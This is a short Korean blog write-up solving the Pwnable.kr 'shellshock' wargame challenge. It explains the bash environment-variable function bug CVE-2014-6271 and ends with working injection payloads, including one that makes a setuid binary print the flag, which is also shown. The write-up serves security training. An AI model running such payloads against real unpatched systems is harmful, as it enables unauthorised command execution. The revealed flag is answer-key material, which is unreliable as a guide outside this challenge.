---
title : Pwnable.kr - shellshock
categories : [Wargame, Pwnable.kr]
---

# shellshock
```
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```
```c
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}
```

# Solution
```
shellshock 취약점은 GNU bash shell에서 환경변수를 통해 공격자가 원격으로
명령어를 실행할 수 있는 취약점임.

자세한 공격 기법은 여기서 확인.
https://kinggod-daddong.tistory.com/4
https://m.blog.naver.com/renucs/220144713558
https://operatingsystems.tistory.com/entry/Shellshock-CVE20146271

요약하면 취약점이 있는 bash version에서 함수를 환경변수로 설정시켜두면
subprocess를 실행시킬 때 조작된 변수를 환경변수로 초기화해주고 
이 과정에서 취약점이 존재하여 {} 이후에 있는 코드가 실행이 됨.

env foo=' () { echo hello; }; pwd; echo vulnerable; ls -al' bash -c :
/root       // pwd
vulnerable  // echo vulnerable
ls -al 명령어 실행 // ls -al
```
```linux
shellshock@pwnable:~$ ./bash
shellshock@pwnable:~$ env dy='() { :; }; /bin/cat ./flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
```
